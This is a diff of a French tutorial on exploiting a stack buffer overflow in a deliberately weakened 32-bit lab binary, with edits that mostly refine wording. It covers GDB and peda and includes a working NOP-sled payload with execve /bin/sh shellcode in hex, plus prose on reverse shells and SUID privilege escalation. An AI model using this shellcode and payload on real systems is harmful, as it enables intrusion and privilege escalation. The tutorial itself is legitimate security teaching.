@@ -12,16 +12,16 @@ Pour cela, si ce n'est déjà fait, je vous invite à lire mon article "[Débute
 
 ## Quel est le principe d'un "buffer overflow" ?
 
-Avant de parler du "overflow", nous allons déjà parler du "buffer".\
-Un "buffer" en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, un fichier...) avant d'être utilisées ou simplement copiée dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l'adresse du buffer peut être envoyée à une fonction d'impression pour l'afficher à l'écran.
+Avant de parler de l'overflow, nous allons déjà parler du "buffer".\
+Un "buffer" en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, contenu d'un fichier...) avant d'être utilisées ou simplement copiées dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l'adresse du buffer peut être envoyée à une fonction d'affichage.
 
 ![buffer](/img/buffer.jpg)
 
 ***Mais... c'est quoi ce truc à la fin de mon buffer ?***\
-"\x00", ça ? **le null byte de fin de chaîne**, et le "\x" permet d'indiquer une valeur he**x**adécimale. Cet octet nul sert tout simplement à indiquer que c'est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s'arrêter de lire en mémoire. La fonction d'impression l'a utilisée pour afficher le texte "Julien" à l'écran. Sans ce caractère nul, la fonction serait incapable de savoir quand est la fin du texte et elle continuerait à lire la suite.
+"\x00", ça ? **le null byte de fin de chaîne**, et le "\x" permet d'indiquer une valeur he**x**adécimale. Cet octet nul sert tout simplement à indiquer que c'est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s'arrêter de lire en mémoire. La fonction d'impression l'a utilisée pour afficher le texte "Julien" à l'écran. Sans ce caractère nul, la fonction serait incapable de savoir où se situe la fin du texte et elle continuerait à lire la suite.
 
-Et voilà..... Ah oui, j'ai failli oublier! Le "overflow" maintenant :)\
-"Overflow" c'est le fait de déborder ce buffer et d'aller écrire en dehors de l'espace réservé à la base. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l'application !
+Et voilà..... Ah oui, j'ai failli oublier! L'overflow maintenant :)\
+"Overflow" c'est le fait de déborder de ce buffer et d'aller écrire en dehors de l'espace initialement prévu. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l'application !
 
 ![overflow](/img/overflow.jpg)
 
@@ -36,23 +36,23 @@ L'objectif c'est de dévier le flux d'exécution du programme et de pouvoir exé
 ***Je ferme l'application et j'exécute directement les commandes que je veux, pourquoi s'embêter ?***\
 Parce que vous n'avez pas forcément les droits nécessaires :p Sur une machine, il y a des services qui peuvent tourner avec des privilèges élevés ou alors des binaires possédant le flag "suid" et là prendre le contrôle d'une telle application devient nettement plus intéressant.
 
-Le flag "suid" pour "Set User ID", est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s'agit d'un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l'utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires et le flag "suid" peut être la solution.
+Quelques exemples motivant un attaquant à exploiter un buffer overflow :
+
+- Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d'exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d'obtenir un reverse shell (un shell qui vient se conecter sur la machine de l'attaquant).
+- Cette fois, l'attaquant à la main sur la machine mais possède des privilèges limités. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d'obtenir un shell possédant les pleins pouvoirs.
+- Maintenant aucun service n'est vulnérable et l'attaquant n'a pas la main sur la machine. Dans un premier temps, il va utiliser de l'ingénierie sociale (manipulation de l'être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l'un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique...) et l'attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).
+
+Le flag "suid" pour "Set User ID", est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s'agit d'un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l'utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires. Par exemple, l'utilitaire "ping" nécessite des privilèges élevés pour ouvrir un socket réseau.
 
 ![suid](/img/suid.jpg)
 
 Pour vérifier si un fichier possède le bit "suid", il suffit simplement d'afficher les permissions du fichier et de regarder s'il ne possède pas la permission "s" à la place du "x". Si c'est le cas, alors le fichier sera exécuté avec les permissions du propriétaire. De plus, quand c'est le cas le nom du fichier apparaîtra sur fond rouge (comme sur ma capture, mais cela va dépendre de votre distribution).
 
-Quelques exemples motivant un attaquant à exploiter un buffer overflow :
-
-- Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d'exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d'obtenir un reverse shell (un shell inversé).
-- Cette fois, l'attaquant à la main sur la machine mais ne possède pas les pleins pouvoirs. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d'obtenir un shell possédant les pleins pouvoirs.
-- Maintenant aucun service n'est vulnérable et l'attaquant n'a pas la main sur la machine. Dans un premier temps, il va utiliser de l'ingénierie sociale (manipulation de l'être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l'un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique...) et l'attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).
-
 Vous voyez qu'il y a un intérêt à exploiter un buffer overflow :) Let's go ??
 
 ## L'utilisation d'un débogueur
 
-Avant de commencer à décortiquer notre programme, nous avons besoin d'un débogueur. Cette chose-là permet d'analyser les bugs d'un programme. Pour ça, il est capable d'exécuter le programme pas-à-pas (ligne par ligne), d'afficher la valeur des variables, de mettre des points d'arrêt à des endroits stratégiques du programme... Ça permet réellement d'analyser et contrôler l'exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.
+Avant de commencer à décortiquer notre application, nous avons besoin d'un débogueur. C'est un logiciel qui permet d'analyser un programme pour trouver des bugs. Pour ça, il est capable d'exécuter le programme pas-à-pas (instruction par instruction), d'afficher la valeur des variables, de mettre des points d'arrêt à des endroits stratégiques du programme... Ça permet d'analyser et contrôler l'exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.
 
 Nous allons utliser **le débogueur GDB (GNU Debugger)** qui est le débogueur standard du projet GNU. Il fonctionne sur de nombreuses architectures de processeur, permet le débogage à distance (via une connexion série ou IP) et fonctionne sur de nombreux systèmes Unix.\
 L'interface graphique ? une simple console :) Vous allez voir que c'est sympa (ce n'est pas de l'ironie) ! On va juste devoir rajouter un petit quelque chose sur GDB pour le rendre plus accueillant.
@@ -62,16 +62,13 @@ L'interface graphique ? une simple console :) Vous allez voir que c'est sympa (c
 GDB est disponible dans la plupart des dépôts sous le nom de paquet "gdb". Commencez donc par l'installer :
 
 ```
-# Debian
 sudo apt-get install gdb
-
-# CentOS
-sudo yum install gdb
 ```
 
 De base, GDB n'est pas très pratique à utiliser. Une commande doit être tapée à chaque fois pour suivre l'exécution du programme, visualiser les registres, la pile, aucune couleur permettant de mettre en évidence les relations, etc...
 
-Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser "peda" pour sa simplicité et son ergonomie. Si vous avez eu l'occasion de suivre mon premier tuto sur l'app-système alors "peda" vous dira quelque chose. Pour l'installer, rien de plus simple :
+Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser "peda" pour sa simplicité et son ergonomie.\
+Pour l'installer, rien de plus simple :
 
 ```
 git clone https://github.com/longld/peda.git ~/peda
@@ -93,7 +90,7 @@ Pour commencer, toutes les commandes GDB possèdent une version longue et courte
 | `run`                                  | r         | Démarrer le programme.                                                                                                                                                                                   |
 | `info functions`                       | i fu      | Afficher la liste des fonctions.                                                                                                                                                                         |
 | `break *0x... ou break *function_name` | b *0x...  | Pose un point d'arrêt à une ligne définie par son adresse ou au début d'une fonction.                                                                                                                    |
-| `display/[quantité][type]x *0x...`     | x/...     | Affiche une zone mémoire à partir de son adresse ou du nom d'une fonction. Type : 'w' 32 bits, 'b' 8 bits...                                                                                             |
+| `display/[quantité][type] *0x...`     | x/...     | Affiche une zone mémoire à partir de son adresse ou du nom d'une fonction. Type : 'w' 32 bits, 'b' 8 bits...                                                                                             |
 | `next [n]`                             | ni [n]    | Exécute [n] instruction(s). Par défaut, [n] est à 1. Vous pouvez donc faire "ni" directement.                                                                                                            |
 | `step`                                 | si [n]    | Pareil que "next". La différence ici c'est qu'on entre dans les fonctions.                                                                                                                               |
 | `disassemble [a]`                      | disas [a] | Désassembler une zone spécifique de la mémoire (affichage du code assembleur). [a] est l'une des adresses de cette zone ou le nom d'une fonction. Par défaut, [a] est la fonction exécutée actuellement. | 
@@ -103,7 +100,8 @@ Pour commencer, toutes les commandes GDB possèdent une version longue et courte
 | `pattern_search`                       |                 | Recherche le schéma précédemment généré en mémoire. |
 
 Pour avoir la liste complète des commandes, les différents types d'affichages, etc... c'est par ici :\
-https://sourceware.org/gdb/onlinedocs/gdb/
+https://sourceware.org/gdb/onlinedocs/gdb/ \
+https://github.com/longld/peda
 
 ***Tips : vous pouvez réexécuter la dernière commande exécutée en tapant simplement sur [Entrée].***
 
@@ -115,14 +113,15 @@ Vous pouvez le télécharger [ici](/binary/overflow).
 Je ne vous donne volontairement pas le code source tout simplement parce que dans une situation réelle, vous ne l'avez pas forcément :)\
 En revanche, voici la commande qui a permis de compiler le programme :\
 ```
-gcc overflow.c -o overflow -fno-stack-protector -z execstack -m32
+gcc overflow.c -o overflow -fno-stack-protector -z execstack -no-pie -m32
 ```
 
 Voici à quoi servent les différents arguments :
 
 - -o **[fichier]** : place la sortie dans le fichier **[fichier]**
-- -fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de GDB, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c'est mieux de la désactiver :)
+- -fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de gcc, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c'est mieux de la désactiver :)
 - -z execstack : permets de rendre la pile exécutable. Vous allez comprendre pourquoi nous avons besoin de cette option par la suite.
+- -no-pie : permets de désactiver la randomisation des espaces d'adresses du code exécutable existant.
 - -m32 : permets de compiler le code source en 32 bits. Les adresses seront moins longues comme ça.
 
 Maintenant nous pouvons lancer le programme pour le tester :
@@ -149,11 +148,7 @@ On va arranger ça. Je pourrais parier que vous avez un OS en 64 bits, non ?\
 Pour que votre OS puisse exécuter des binaires en 32 bits, il vous faut la bibliothèque standard C++ en version 32 bits. Pour l'obtenir, installez simplement ce paquet :
 
 ```
-# Debian
 sudo apt-get install lib32stdc++6
-
-# CentOS
-sudo yum install libstdc++.i686
 ```
 
 Ça fonctionne ? Parfait, nous allons pouvoir passer à la suite.
@@ -207,7 +202,7 @@ Nous allons lister les fonctions présentes afin d'y voir plus clair :
 ![gdb_functions](/img/gdb_functions.jpg)
 
 ***Mais... il y en a beaucoup pour un simple programme !***\
-Toutes les fonctions commençant par un underscore ou finissants par "@plt" ne sont souvent pas des fonctions développées par le développeur du programme. C'est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d'initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions "...register...clones" et "frame_dummy" peuvent également être ignorées.\
+Toutes les fonctions commençant par un underscore ou finissants par "@plt" ne sont souvent pas des fonctions développées par le développeur. C'est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d'initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions "...register...clones" et "frame_dummy" peuvent également être ignorées.\
 Bon allez, voici une commande permettant d'afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de "@" :
 
 ![gdb_functions_filter](/img/gdb_functions_filter.jpg)
@@ -297,10 +292,10 @@ Le shellcode a été trouvé sur [shell-storm.org](http://shell-storm.org/shellc
 Ce code va donc effectuer l'appel système **execve** qui permet d'exécuter un programme (pour nous /bin/sh). En langage C, cela donnerait :
 
 ```
-execve("/bin//sh", ["/bin//sh"]);
+execve("/bin//sh", ["/bin//sh"], 0);
 ```
 
-Les informations nécessaires pour réaliser un syscall peuvent être trouvées ici : https://w3challs.com/syscalls/?arch=x86
+Les informations nécessaires pour réaliser un syscall (convention 32 bits) peuvent être trouvées ici : https://w3challs.com/syscalls/?arch=x86
 
 ### Écriture de l'exploit
 
@@ -319,14 +314,14 @@ La valeur hexadécimale d'un nop est "\x90". Ce schéma illustre la forme de not
 En Python, cela donnerait :
 
 `
-print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "pool_address"
+print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "sled_address"
 `
 
-Pour calculer l'adresse du pool, il suffit simplement de récupérer l'adresse du haut de la pile au moment du "ret" et d'enlever 44 (0x2c).
+Pour calculer l'adresse du sled, il suffit simplement de récupérer l'adresse du haut de la pile au moment du "ret" et d'enlever 44 (0x2c).
 
-![overflow pool address](/img/overflow_pool_address.jpg)
+![overflow sled address](/img/overflow_sled_address.jpg)
 
-Pour être tranquille, je ne vais pas prendre exactement le début du pool mais un peu après. Ma charge finale donne donc :
+Pour être tranquille, je ne vais pas prendre exactement le début du sled mais un peu après. Ma charge finale donne donc :
 
 `
 print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xf5\xc4\xff\xff"
@@ -343,7 +338,7 @@ gdb-peda$ r < <(python -c 'print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x
 
 Félicitations à vous !
 
-***Je n'ai pas compris pourquoi nous avions dû inverser l'ordre des octets pour l'adresse du pool...***\
+***Je n'ai pas compris pourquoi nous avions dû inverser l'ordre des octets pour l'adresse du sled...***\
 Effectivement, je n'ai pas donné d'explication sur cette inversion. En informatique, il y a deux façons d'écrire une adresse et on appelle cela l'[endianness](https://fr.wikipedia.org/wiki/Endianness). Les architectures de processeurs utilisent l'une ou l'autre :
 
 - Big endian : l'ordre des octets sont de gauche à droite (octets de poids fort au poids faible). Par exemple `0xA0B70708` => `A0 B7 07 08`.
